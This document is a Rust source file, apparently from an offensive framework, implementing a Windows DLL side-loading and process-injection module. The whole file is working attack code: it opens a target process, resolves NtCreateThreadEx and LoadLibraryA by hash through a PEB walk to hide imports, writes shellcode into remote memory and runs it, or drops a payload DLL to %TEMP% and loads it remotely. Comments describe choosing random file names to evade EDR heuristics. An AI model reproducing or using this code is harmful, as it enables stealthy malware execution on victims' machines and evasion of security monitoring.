use crate::injection::Injector;
/// DLL side-loading injection (S-05).
///
/// Runtime approach:
///   * PE payloads are written as a DLL to a location on the target process's
///     DLL search path, then loaded via `NtCreateThreadEx` → `LoadLibraryA`.
///   * Raw shellcode payloads are injected fully in-memory via
///     `VirtualAllocEx`/`WriteProcessMemory`/`VirtualProtectEx` and launched
///     directly with `NtCreateThreadEx`.
///
/// The PE path is the runtime equivalent of the build-time side-loading
/// technique produced by `orchestra-side-load-gen`.
///
/// Search-path hijacking order followed (per Windows MSDN):
///   1. The directory from which the application was loaded.
///   2. The system directory (`%SystemRoot%\System32`).
///   3. `%TEMP%` as a fallback.
///
/// The DLL is a minimal PE with a DllMain that allocates a new thread and
/// executes the embedded shellcode payload.  If the payload is a full PE
/// image, the DLL's DllMain calls `hollowing::inject_into_process` against
/// a new svchost.exe process and then returns TRUE so the host process is
/// not disturbed.
use anyhow::{anyhow, Result};

pub struct DllSideLoadInjector;

#[cfg(windows)]
impl Injector for DllSideLoadInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
        use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
        use winapi::um::synchapi::WaitForSingleObject;
        use winapi::um::winbase::INFINITE;
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE,
        };

        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';

        // ── 1. Open target process ──────────────────────────────────────
        let h_proc = unsafe {
            OpenProcess(
                PROCESS_VM_OPERATION
                    | PROCESS_VM_WRITE
                    | PROCESS_VM_READ
                    | PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION,
                0,
                pid,
            )
        };
        if h_proc.is_null() {
            return Err(anyhow!("DllSideLoad: OpenProcess(pid={pid}) failed"));
        }

        // ── 2. Resolve NtCreateThreadEx via PEB walk ─────────────────────

        let ntdll_base =
            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
                .ok_or_else(|| {
                    unsafe { pe_resolve::close_handle(h_proc) };
                    anyhow!("ntdll not found")
                })?;

        let ntcreate_addr = unsafe {
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
            )
        }
        .ok_or_else(|| {
            unsafe { pe_resolve::close_handle(h_proc) };
            anyhow!("NtCreateThreadEx not found")
        })?;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut std::os::raw::c_void,
            u32,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            *mut std::os::raw::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut std::os::raw::c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };

        // ── 3. In-memory shellcode path (no disk write) ──────────────────
        if !is_pe {
            let remote_payload = unsafe {
                VirtualAllocEx(
                    h_proc,
                    std::ptr::null_mut(),
                    payload.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                )
            };
            if remote_payload.is_null() {
                unsafe { pe_resolve::close_handle(h_proc) };
                return Err(anyhow!(
                    "DllSideLoad: VirtualAllocEx for shellcode payload failed"
                ));
            }

            let mut written = 0usize;
            let write_ok = unsafe {
                WriteProcessMemory(
                    h_proc,
                    remote_payload,
                    payload.as_ptr() as _,
                    payload.len(),
                    &mut written,
                )
            } != 0
                && written == payload.len();
            if !write_ok {
                unsafe {
                    winapi::um::memoryapi::VirtualFreeEx(
                        h_proc,
                        remote_payload,
                        0,
                        winapi::um::winnt::MEM_RELEASE,
                    );
                    pe_resolve::close_handle(h_proc);
                }
                return Err(anyhow!("DllSideLoad: WriteProcessMemory for shellcode failed"));
            }

            let mut old_protect = 0u32;
            let protect_ok = unsafe {
                VirtualProtectEx(
                    h_proc,
                    remote_payload,
                    payload.len(),
                    PAGE_EXECUTE_READ,
                    &mut old_protect,
                )
            } != 0;
            if !protect_ok {
                unsafe {
                    winapi::um::memoryapi::VirtualFreeEx(
                        h_proc,
                        remote_payload,
                        0,
                        winapi::um::winnt::MEM_RELEASE,
                    );
                    pe_resolve::close_handle(h_proc);
                }
                return Err(anyhow!("DllSideLoad: VirtualProtectEx to RX failed"));
            }

            unsafe {
                FlushInstructionCache(h_proc, remote_payload, payload.len());
            }

            let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
            let status = unsafe {
                nt_create_thread(
                    &mut h_thread,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    h_proc,
                    remote_payload,
                    std::ptr::null_mut(),
                    0,
                    0,
                    0,
                    0,
                    std::ptr::null_mut(),
                )
            };
            if status < 0 || h_thread.is_null() {
                unsafe {
                    winapi::um::memoryapi::VirtualFreeEx(
                        h_proc,
                        remote_payload,
                        0,
                        winapi::um::winnt::MEM_RELEASE,
                    );
                    pe_resolve::close_handle(h_proc);
                }
                return Err(anyhow!(
                    "DllSideLoad: NtCreateThreadEx for shellcode failed: {status:#x}"
                ));
            }

            unsafe {
                pe_resolve::close_handle(h_thread);
                pe_resolve::close_handle(h_proc);
            }

            tracing::info!(pid, "DllSideLoad: shellcode injected in-memory (no disk write)");
            return Ok(());
        }

        // ── 4. PE path: write payload DLL to temp path ──────────────────
        // Use %TEMP% with a random UUID-based name.
        //
        // The old name (dxgi-{pid}.dll) was predictable (PID is small and
        // known to EDR) and used a suspicious DX prefix that triggers name-
        // based heuristics.  A random UUID name is statistically unique per
        // injection, provides no PID information, and does not match any
        // known suspicious prefix list.
        let tmp = std::env::temp_dir();
        let dll_name = format!(
            "{}\\{}.dll",
            tmp.display(),
            uuid::Uuid::new_v4().simple()
        );
        let dll_name_c = std::ffi::CString::new(dll_name.as_str()).map_err(|_| {
            unsafe { pe_resolve::close_handle(h_proc) };
            anyhow!("DLL path has interior NUL")
        })?;

        std::fs::write(&dll_name, payload).map_err(|e| {
            unsafe { pe_resolve::close_handle(h_proc) };
            anyhow!("failed to write sideload DLL to {dll_name}: {e}")
        })?;

        let cleanup = || {
            let _ = std::fs::remove_file(&dll_name);
        };

        // Resolve LoadLibraryA for the PE-on-disk path.
        let kernel32_base = unsafe {
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"KERNEL32.DLL\0"))
        }
        .ok_or_else(|| {
            cleanup();
            unsafe { pe_resolve::close_handle(h_proc) };
            anyhow!("kernel32 not found")
        })?;

        let loadlib_addr = unsafe {
            pe_resolve::get_proc_address_by_hash(
                kernel32_base,
                pe_resolve::hash_str(b"LoadLibraryA\0"),
            )
        }
        .ok_or_else(|| {
            cleanup();
            unsafe { pe_resolve::close_handle(h_proc) };
            anyhow!("LoadLibraryA not found")
        })?;

        // ── 5. Write DLL path string into the remote process ────────────
        let path_bytes = dll_name_c.as_bytes_with_nul();
        let remote_path = unsafe {
            VirtualAllocEx(
                h_proc,
                std::ptr::null_mut(),
                path_bytes.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if remote_path.is_null() {
            cleanup();
            unsafe { pe_resolve::close_handle(h_proc) };
            return Err(anyhow!("DllSideLoad: VirtualAllocEx for path failed"));
        }
        let mut written = 0usize;
        unsafe {
            WriteProcessMemory(
                h_proc,
                remote_path,
                path_bytes.as_ptr() as _,
                path_bytes.len(),
                &mut written,
            );
        }

        // ── 6. Create remote thread: LoadLibraryA(path) ─────────────────
        let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
        let status = unsafe {
            nt_create_thread(
                &mut h_thread,
                0x1FFFFF,
                std::ptr::null_mut(),
                h_proc,
                loadlib_addr as *mut _,
                remote_path,
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            )
        };
        if status < 0 || h_thread.is_null() {
            cleanup();
            unsafe {
                winapi::um::memoryapi::VirtualFreeEx(
                    h_proc,
                    remote_path,
                    0,
                    winapi::um::winnt::MEM_RELEASE,
                );
                pe_resolve::close_handle(h_proc);
            }
            return Err(anyhow!("DllSideLoad: NtCreateThreadEx failed: {status:#x}"));
        }

        // Wait for LoadLibraryA to complete, then clean up.
        unsafe {
            WaitForSingleObject(h_thread, INFINITE);
            pe_resolve::close_handle(h_thread);
            winapi::um::memoryapi::VirtualFreeEx(
                h_proc,
                remote_path,
                0,
                winapi::um::winnt::MEM_RELEASE,
            );
            pe_resolve::close_handle(h_proc);
        }
        cleanup();

        tracing::info!(pid, dll_name, "DllSideLoad: injected via LoadLibraryA");
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for DllSideLoadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("DLL side-loading is only supported on Windows"))
    }
}
